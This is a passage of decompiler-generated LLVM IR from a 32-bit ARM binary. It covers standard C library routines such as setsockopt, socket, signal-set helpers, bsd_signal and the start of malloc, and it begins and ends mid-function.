  %v2_13b74 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13b74, i32* @r4, align 4
  store i32 %v6_13afc, i32* @r5, align 4
  store i32 %v9_13afc, i32* @r6, align 4
  store i32 %v12_13afc, i32* @r7, align 4
  store i32 %v15_13afc, i32* @r8, align 4
  store i32 %v18_13afc, i32* @sb, align 4
  store i32 %v21_13afc, i32* @sl, align 4
  store i32 %v24_13afc, i32* @lr, align 4
  ret i32 %v0_13b6c

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13b84 = load i32, i32* @r4, align 4
  store i32 %v3_13b84, i32* %stack_var_-12, align 4
  %v0_13b94 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13b94, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13b94, -4095
  br i1 %tmp, label %dec_label_pc_13bbc, label %dec_label_pc_13ba4

dec_label_pc_13ba4:                               ; preds = %entry
  %v0_13ba8 = call i32 @__aeabi_read_tp()
  %v3_13bac = load i16, i16* @global_var_24150.533, align 2
  %v4_13bac = sext i16 %v3_13bac to i32
  store i32 %v4_13bac, i32* @r3, align 4
  %v0_13bb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13bb0 = sub i32 0, %v0_13bb0
  store i32 %v1_13bb0, i32* %r2.global-to-local, align 4
  %v3_13bb4 = add i32 %v4_13bac, %v0_13ba8
  %v4_13bb4 = inttoptr i32 %v3_13bb4 to i32*
  store i32 %v1_13bb0, i32* %v4_13bb4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13bbc.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13bbc

dec_label_pc_13bbc:                               ; preds = %entry, %dec_label_pc_13ba4
  %v1_13bc0 = phi i32 [ %v0_13b94, %entry ], [ -1, %dec_label_pc_13ba4 ]
  %v2_13bbc = phi i32 [ %v3_13b84, %entry ], [ %v2_13bbc.pre, %dec_label_pc_13ba4 ]
  store i32 %v2_13bbc, i32* @r4, align 4
  ret i32 %v1_13bc0

; uselistorder directives
  uselistorder i32 %v0_13b94, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13bbc, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1) local_unnamed_addr {
dec_label_pc_13bc4:
  %v0_13bc4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13bc4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13bc4
  %v2_13bc4 = load i32, i32* @r6, align 4
  %v5_13bc4 = udiv i32 %v2_13bc4, 4
  %v6_13bc4 = and i32 %v5_13bc4, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13bc4, %bb
  %v4_13bc8 = phi i32 [ %arg1, %dec_label_pc_13bc4 ], [ %v6_13bc4, %bb ]
  ret i32 %v4_13bc8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13bcc = load i32, i32* @r7, align 4
  store i32 %v3_13bcc, i32* %stack_var_-8, align 4
  %v0_13bd8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13bd8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13bd8, -4095
  br i1 %tmp, label %dec_label_pc_13c00, label %dec_label_pc_13be8

dec_label_pc_13be8:                               ; preds = %entry
  %v0_13bec = call i32 @__aeabi_read_tp()
  %v3_13bf0 = load i16, i16* @global_var_24150.533, align 2
  %v4_13bf0 = sext i16 %v3_13bf0 to i32
  store i32 %v4_13bf0, i32* @r3, align 4
  %v0_13bf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13bf4 = sub i32 0, %v0_13bf4
  store i32 %v1_13bf4, i32* %r2.global-to-local, align 4
  %v3_13bf8 = add i32 %v4_13bf0, %v0_13bec
  %v4_13bf8 = inttoptr i32 %v3_13bf8 to i32*
  store i32 %v1_13bf4, i32* %v4_13bf8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13c00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13c00

dec_label_pc_13c00:                               ; preds = %entry, %dec_label_pc_13be8
  %v1_13c04 = phi i32 [ %v0_13bd8, %entry ], [ -1, %dec_label_pc_13be8 ]
  %v2_13c00 = phi i32 [ %v3_13bcc, %entry ], [ %v2_13c00.pre, %dec_label_pc_13be8 ]
  store i32 %v2_13c00, i32* @r7, align 4
  ret i32 %v1_13c04

; uselistorder directives
  uselistorder i32 %v0_13bd8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13c00, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13c08:
  %v0_13c08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c08, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13c08
  %v2_13c0c = load i32, i32* @r8, align 4
  %v3_13c0c = load i32, i32* @r5, align 4
  %v8_13c0c = ashr i32 %v2_13c0c, %v3_13c0c
  %v9_13c0c = and i32 %v8_13c0c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13c08, %bb
  %v10_13c0c = phi i32 [ %arg1, %dec_label_pc_13c08 ], [ %v9_13c0c, %bb ]
  ret i32 %v10_13c0c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_13c28, label %dec_label_pc_13c20

dec_label_pc_13c20:                               ; preds = %entry
  %v7_13c24 = icmp slt i32 %arg1, 65
  br i1 %v7_13c24, label %dec_label_pc_13c44, label %dec_label_pc_13c28

dec_label_pc_13c28:                               ; preds = %dec_label_pc_13c20, %entry
  %v0_13c2c = call i32 @__aeabi_read_tp()
  %v3_13c30 = load i16, i16* @global_var_24150.533, align 2
  %v4_13c30 = sext i16 %v3_13c30 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13c3c = add i32 %v4_13c30, %v0_13c2c
  %v4_13c3c = inttoptr i32 %v3_13c3c to i32*
  store i32 22, i32* %v4_13c3c, align 4
  %v0_13c4c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13c4c

dec_label_pc_13c44:                               ; preds = %dec_label_pc_13c20
  %v0_13c44 = call i32 @__sigaddset()
  store i32 %v0_13c44, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13c4c

dec_label_pc_13c4c:                               ; preds = %dec_label_pc_13c28, %dec_label_pc_13c44
  %v0_13c4c = phi i32 [ %v0_13c4c.pre, %dec_label_pc_13c28 ], [ %v0_13c44, %dec_label_pc_13c44 ]
  ret i32 %v0_13c4c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c4c, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_13c68 = add i32 %tmp, 4
  %v3_13c68 = inttoptr i32 %v2_13c68 to i32*
  store i32 0, i32* %v3_13c68, align 4
  %v1_13c6c = load i32, i32* %r3.global-to-local, align 4
  %v2_13c6c = inttoptr i32 %v1_13c6c to i32*
  store i32 0, i32* %v2_13c6c, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13c74 = load i32, i32* @r4, align 4
  store i32 %v3_13c74, i32* %stack_var_-16, align 4
  %v6_13c74 = load i32, i32* @r5, align 4
  %v9_13c74 = load i32, i32* @r6, align 4
  %v7_13c7c = icmp eq i32 %arg2, -1
  br i1 %v7_13c7c, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_13c84 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_13ca0

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_13ca8

dec_label_pc_13ca0:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r6, align 4
  %v7_13ca4 = icmp slt i32 %arg1, 65
  br i1 %v7_13ca4, label %dec_label_pc_13cc4, label %dec_label_pc_13ca8

dec_label_pc_13ca8:                               ; preds = %.thread16, %dec_label_pc_13ca0
  %v0_13cac = call i32 @__aeabi_read_tp()
  %v3_13cb0 = load i16, i16* @global_var_24150.533, align 2
  %v4_13cb0 = sext i16 %v3_13cb0 to i32
  store i32 %v4_13cb0, i32* @r2, align 4
  store i32 22, i32* @r3, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13cbc = add i32 %v4_13cb0, %v0_13cac
  %v4_13cbc = inttoptr i32 %v3_13cbc to i32*
  store i32 22, i32* %v4_13cbc, align 4
  %v0_13d1c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_13cc4:                               ; preds = %dec_label_pc_13ca0
  %v2_13cc4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13cc4, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_13ccc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_13ccc, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_13cdc = call i32 @__sigaddset()
  %v0_13ce4 = load i32, i32* @r5, align 4
  store i32 %v0_13ce4, i32* %r1.global-to-local, align 4
  %v0_13ce8 = load i32, i32* @r6, align 4
  %v2_13ce8 = add i32 %v0_13ce8, 12068
  %v2_13cec = call i32 @__GI___sigismember(i32 %v2_13ce8, i32 %v0_13ce4)
  store i32 %v2_13cc4, i32* %r1.global-to-local, align 4
  %v0_13d00 = load i32, i32* @r5, align 4
  %v3_13d0c = call i32 @__libc_sigaction(i32 %v0_13d00, i32 %v2_13cc4, i32 %v2_13c84)
  %v1_13d10 = icmp slt i32 %v3_13d0c, 0
  br i1 %v1_13d10, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_13cc4
  %v5_13d14 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_13d14, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_13cc4
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_13ca8, %bb32
  %v0_13d1c = phi i32 [ %v5_13d14, %bb31 ], [ %v0_13d1c.pre, %dec_label_pc_13ca8 ], [ -1, %bb32 ]
  %v2_13d24 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13d24, i32* @r4, align 4
  store i32 %v6_13c74, i32* @r5, align 4
  store i32 %v9_13c74, i32* @r6, align 4
  ret i32 %v0_13d1c

; uselistorder directives
  uselistorder i32 %v2_13cc4, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13ca8, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_13d38 = add i32 %arg2, -1
  %v3_13d3c = udiv i32 %v1_13d38, 32
  %v4_13d40 = mul nuw nsw i32 %v3_13d3c, 4
  %v5_13d40 = add i32 %v4_13d40, %arg1
  %v6_13d40 = inttoptr i32 %v5_13d40 to i32*
  %v7_13d40 = load i32, i32* %v6_13d40, align 4
  %v1_13d44 = urem i32 %v1_13d38, 32
  %v7_13d4c = shl i32 1, %v1_13d44
  %v8_13d4c = and i32 %v7_13d40, %v7_13d4c
  %v10_13d4c = icmp ne i32 %v8_13d4c, 0
  %. = zext i1 %v10_13d4c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_13d38, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_13d5c = load i32, i32* @r1, align 4
  %v1_13d5c = add i32 %v0_13d5c, -1
  %v3_13d60 = udiv i32 %v1_13d5c, 32
  %v0_13d64 = load i32, i32* @r0, align 4
  %v4_13d64 = mul nuw nsw i32 %v3_13d60, 4
  %v5_13d64 = add i32 %v0_13d64, %v4_13d64
  %v6_13d64 = inttoptr i32 %v5_13d64 to i32*
  %v7_13d64 = load i32, i32* %v6_13d64, align 4
  %v1_13d68 = urem i32 %v1_13d5c, 32
  %v7_13d70 = shl i32 1, %v1_13d68
  %v8_13d70 = or i32 %v7_13d64, %v7_13d70
  store i32 %v8_13d70, i32* %v6_13d64, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13d5c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_13d80 = add i32 %arg2, -1
  %v3_13d84 = udiv i32 %v1_13d80, 32
  %v4_13d88 = mul nuw nsw i32 %v3_13d84, 4
  %v5_13d88 = add i32 %v4_13d88, %arg1
  %v6_13d88 = inttoptr i32 %v5_13d88 to i32*
  %v7_13d88 = load i32, i32* %v6_13d88, align 4
  %v1_13d8c = urem i32 %v1_13d80, 32
  %tmp = shl i32 -1, %v1_13d8c
  %v8_13d94 = add i32 %tmp, -1
  %v9_13d94 = and i32 %v7_13d88, %v8_13d94
  store i32 %v9_13d94, i32* %v6_13d88, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13d80, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_13da4 = udiv i32 %arg1, 256
  store i32 %v3_13da4, i32* %r1.global-to-local, align 4
  %v2_13da8 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_13da8, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_13db4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_13da8, i32 %v0_13db4)
  %v0_13db8 = load i32, i32* %r1.global-to-local, align 4
  %v1_13db8 = add i32 %v0_13db8, 1048320
  %v3_13dbc = udiv i32 %v1_13db8, 65536
  %v1_13dc0 = and i32 %v3_13dbc, 8
  %v6_13dc4 = shl i32 %v0_13db8, %v1_13dc0
  %v1_13dc8 = add i32 %v6_13dc4, 520192
  %v3_13dcc = udiv i32 %v1_13dc8, 65536
  %v1_13dd0 = and i32 %v3_13dcc, 4
  %v6_13dd4 = shl i32 %v6_13dc4, %v1_13dd0
  %v1_13dd8 = add i32 %v6_13dd4, 245760
  %v3_13ddc = udiv i32 %v1_13dd8, 65536
  %v1_13de0 = and i32 %v3_13ddc, 2
  %v6_13de4 = shl i32 %v6_13dd4, %v1_13de0
  store i32 %v6_13de4, i32* %r1.global-to-local, align 4
  %v1_13de8 = sub nsw i32 13, %v1_13dc0
  %v2_13dec = sub nsw i32 %v1_13de8, %v1_13dd0
  %v3_13df0 = udiv i32 %v6_13de4, 32768
  %v4_13df0 = sub nuw nsw i32 -1, %v3_13df0
  %v4_13df4 = udiv i32 %v6_13de4, 16384
  %v5_13df4 = and i32 %v4_13df4, %v4_13df0
  %v2_13df8 = sub nsw i32 %v2_13dec, %v1_13de0
  %v2_13dfc = add nsw i32 %v2_13df8, %v5_13df4
  %v1_13e00 = add nsw i32 %v2_13dfc, 6
  %v0_13e04 = load i32, i32* %ip.global-to-local, align 4
  %v6_13e04 = lshr i32 %v0_13e04, %v1_13e00
  %v3_13e08 = mul nsw i32 %v2_13dfc, 4
  %v1_13e0c = add nsw i32 %v3_13e08, 32
  %v1_13e10 = urem i32 %v6_13e04, 4
  %v2_13e14 = or i32 %v1_13e10, %v1_13e0c
  ret i32 %v2_13e14

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_13e1c = load i32, i32* @r4, align 4
  %v6_13e1c = load i32, i32* @r5, align 4
  %v9_13e1c = load i32, i32* @r6, align 4
  %v12_13e1c = load i32, i32* @r7, align 4
  %v15_13e1c = load i32, i32* @r8, align 4
  %v18_13e1c = load i32, i32* @sb, align 4
  %v21_13e1c = load i32, i32* @sl, align 4
  %v24_13e1c = load i32, i32* @fp, align 4
  %v27_13e1c = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r1.global-to-local, align 4
  %v4_13e30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 108) to i32*), align 4
  store i32 %v4_13e30, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_13e3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 68) to i32*), align 4
  store i32 %v4_13e3c, i32* %r1.global-to-local, align 4
  %v0_13e40 = load i32, i32* @r0, align 4
  store i32 %v0_13e40, i32* @r5, align 4
  store i32 %v4_13e30, i32* %r2.global-to-local, align 4
  %v2_13e48 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13e48, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %ip.global-to-local, align 4
  %v4_13e54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 112) to i32*), align 4
  store i32 %v4_13e54, i32* %ip.global-to-local, align 4
  store i32 81504, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13e54)
  %v0_13e60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13e60, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r1.global-to-local, align 4
  %v4_13e6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 16) to i32*), align 4
  store i32 %v4_13e6c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_13e78.630 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13e6c)
  %v0_13e78 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_13e78, -32
  br i1 %tmp, label %dec_label_pc_13e9c, label %dec_label_pc_13e80

dec_label_pc_13e80:                               ; preds = %entry
  store i32 66240, i32* %r2.global-to-local, align 4
  %v0_13e84 = call i32 @__aeabi_read_tp()
  store i32 %v0_13e84, i32* %r0.global-to-local, align 4
  %v3_13e88 = load i16, i16* @global_var_24150.533, align 2
  %v4_13e88 = sext i16 %v3_13e88 to i32
  store i32 %v4_13e88, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_13e94 = add i32 %v4_13e88, %v0_13e84
  %v4_13e94 = inttoptr i32 %v3_13e94 to i32*
  store i32 12, i32* %v4_13e94, align 4
  br label %dec_label_pc_14720

dec_label_pc_13e9c:                               ; preds = %entry
  %v1_13e9c = add i32 %v0_13e78, 11
  store i32 %v1_13e9c, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r2.global-to-local, align 4
  %v2_13ea8 = icmp ugt i32 %v1_13e9c, 14
  %v7_13ea8 = icmp eq i32 %v1_13e9c, 15
  %v2_13eac = xor i1 %v7_13ea8, true
  %v3_13eac = and i1 %v2_13ea8, %v2_13eac
  br i1 %v3_13eac, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_13e9c
  %v5_13eac = and i32 %v1_13e9c, -8
  store i32 %v5_13eac, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_13e9c, %bb
  %v4_13eb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_13eb0, i32* @r0, align 4
  %v1_13eb4 = inttoptr i32 %v4_13eb0 to i32*
  %v2_13eb4 = load i32, i32* %v1_13eb4, align 4
  store i32 %v2_13eb4, i32* @r4, align 4
  %v2_13eb8 = xor i1 %v2_13ea8, true
  %v3_13eb8 = or i1 %v7_13ea8, %v2_13eb8
  br i1 %v3_13eb8, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_13ebc = urem i32 %v2_13eb4, 2
  %v2_13ebc = icmp eq i32 %v1_13ebc, 0
  br i1 %v2_13ebc, label %dec_label_pc_13ec4, label %dec_label_pc_13ed4

dec_label_pc_13ec4:                               ; preds = %bb143
  %v2_13ec4 = icmp eq i32 %v2_13eb4, 0
  br i1 %v2_13ec4, label %dec_label_pc_13ecc, label %dec_label_pc_142b0

dec_label_pc_13ecc:                               ; preds = %dec_label_pc_13ec4
  %v0_13ecc = call i32 @__malloc_consolidate()
  store i32 %v0_13ecc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_142b0

dec_label_pc_13ed4:                               ; preds = %bb143
  %v0_13ed4 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_13ed4, %v2_13eb4
  br i1 %tmp204, label %dec_label_pc_13efc, label %dec_label_pc_13edc

dec_label_pc_13edc:                               ; preds = %dec_label_pc_13ed4
  %v1_13edc = add i32 %v4_13eb0, -4
  store i32 %v1_13edc, i32* %r1.global-to-local, align 4
  %v3_13ee0 = udiv i32 %v0_13ed4, 8
  store i32 %v3_13ee0, i32* %r2.global-to-local, align 4
  %v4_13ee4 = mul nuw i32 %v3_13ee0, 4
  %v5_13ee4 = add i32 %v4_13ee4, %v1_13edc
  %v6_13ee4 = inttoptr i32 %v5_13ee4 to i32*
  %v7_13ee4 = load i32, i32* %v6_13ee4, align 4
  store i32 %v7_13ee4, i32* %r0.global-to-local, align 4
  %v2_13ee8 = icmp eq i32 %v7_13ee4, 0
  br i1 %v2_13ee8, label %dec_label_pc_13efc, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13edc
  %v2_13eec = add i32 %v7_13ee4, 8
  %v3_13eec = inttoptr i32 %v2_13eec to i32*
  %v4_13eec = load i32, i32* %v3_13eec, align 4
  store i32 %v4_13eec, i32* %r3.global-to-local, align 4
  store i32 %v2_13eec, i32* %r0.global-to-local, align 4
  store i32 %v2_13eec, i32* %r4.global-to-local, align 4
  store i32 %v4_13eec, i32* %v6_13ee4, align 4
  br label %dec_label_pc_14704

dec_label_pc_13efc:                               ; preds = %dec_label_pc_13edc, %dec_label_pc_13ed4
  %tmp205 = icmp ugt i32 %v0_13ed4, 255
  br i1 %tmp205, label %dec_label_pc_13f4c, label %dec_label_pc_13f04

dec_label_pc_13f04:                               ; preds = %dec_label_pc_13efc
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13f0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  %v3_13f10 = udiv i32 %v0_13ed4, 8
  store i32 %v3_13f10, i32* @r7, align 4
  %v4_13f14 = mul nuw i32 %v3_13f10, 8
  %v5_13f14 = add i32 %v4_13f0c, %v4_13f14
  store i32 %v5_13f14, i32* %r3.global-to-local, align 4
  %v1_13f18 = add i32 %v5_13f14, 44
  store i32 %v1_13f18, i32* %ip.global-to-local, align 4
  %v1_13f1c = add i32 %v5_13f14, 56
  %v2_13f1c = inttoptr i32 %v1_13f1c to i32*
  %v3_13f1c = load i32, i32* %v2_13f1c, align 4
  store i32 %v3_13f1c, i32* %r0.global-to-local, align 4
  %v9_13f20 = icmp eq i32 %v3_13f1c, %v1_13f18
  br i1 %v9_13f20, label %dec_label_pc_140ac, label %dec_label_pc_13f28

dec_label_pc_13f28:                               ; preds = %dec_label_pc_13f04
  %v2_13f28 = add i32 %v3_13f1c, %v0_13ed4
  store i32 %v2_13f28, i32* %r3.global-to-local, align 4
  %v1_13f2c = add i32 %v2_13f28, 4
  %v2_13f2c = inttoptr i32 %v1_13f2c to i32*
  %v3_13f2c = load i32, i32* %v2_13f2c, align 4
  store i32 %v3_13f2c, i32* %r2.global-to-local, align 4
  %v1_13f30 = add i32 %v3_13f1c, 12
  %v2_13f30 = inttoptr i32 %v1_13f30 to i32*
  %v3_13f30 = load i32, i32* %v2_13f30, align 4
  store i32 %v3_13f30, i32* %r1.global-to-local, align 4
  %v1_13f34 = or i32 %v3_13f2c, 1
  store i32 %v1_13f34, i32* %r2.global-to-local, align 4
  %v1_13f38 = add i32 %v3_13f1c, 8
  store i32 %v1_13f38, i32* %r4.global-to-local, align 4
  store i32 %v1_13f34, i32* %v2_13f2c, align 4
  %v0_13f40 = load i32, i32* %ip.global-to-local, align 4
  %v1_13f40 = load i32, i32* %r1.global-to-local, align 4
  %v2_13f40 = add i32 %v1_13f40, 8
  %v3_13f40 = inttoptr i32 %v2_13f40 to i32*
  store i32 %v0_13f40, i32* %v3_13f40, align 4
  %v0_13f44 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f44 = load i32, i32* %ip.global-to-local, align 4
  %v2_13f44 = add i32 %v1_13f44, 12
  %v3_13f44 = inttoptr i32 %v2_13f44 to i32*
  store i32 %v0_13f44, i32* %v3_13f44, align 4
  br label %dec_label_pc_14704

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13efc
  store i32 %v0_13ed4, i32* %r0.global-to-local, align 4
  %v1_13f50 = call i32 @__malloc_largebin_index(i32 %v0_13ed4)
  store i32 %v1_13f50, i32* %r0.global-to-local, align 4
  %v0_13f54 = load i32, i32* @r4, align 4
  %v1_13f54 = and i32 %v0_13f54, 2
  %v2_13f54 = icmp eq i32 %v1_13f54, 0
  store i32 %v1_13f50, i32* @r7, align 4
  br i1 %v2_13f54, label %dec_label_pc_140ac, label %dec_label_pc_13f60

dec_label_pc_13f60:                               ; preds = %dec_label_pc_13f4c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r1.global-to-local, align 4
  %v4_13f68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_13f68, i32* @r0, align 4
  %v0_13f6c = call i32 @__malloc_consolidate()
  store i32 %v0_13f6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140ac

dec_label_pc_13f74:                               ; preds = %dec_label_pc_140c0
  %v1_13f74 = add i32 %v3_140c0, 4
  %v2_13f74 = inttoptr i32 %v1_13f74 to i32*
  %v3_13f74 = load i32, i32* %v2_13f74, align 4
  store i32 %v3_13f74, i32* %r3.global-to-local, align 4
  %v0_13f78 = load i32, i32* @sl, align 4
  %v1_13f7c = and i32 %v3_13f74, -4
  store i32 %v1_13f7c, i32* %r4.global-to-local, align 4
  %v1_13f80 = add i32 %v3_140c0, 12
  %v2_13f80 = inttoptr i32 %v1_13f80 to i32*
  %v3_13f80 = load i32, i32* %v2_13f80, align 4
  store i32 %v3_13f80, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_13f78, 255
  br i1 %tmp206, label %dec_label_pc_13fdc, label %dec_label_pc_13f88

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13f74
  %v9_13f88 = icmp eq i32 %v3_13f80, %v0_13fe0
  br i1 %v9_13f88, label %dec_label_pc_13f90, label %dec_label_pc_13fdc

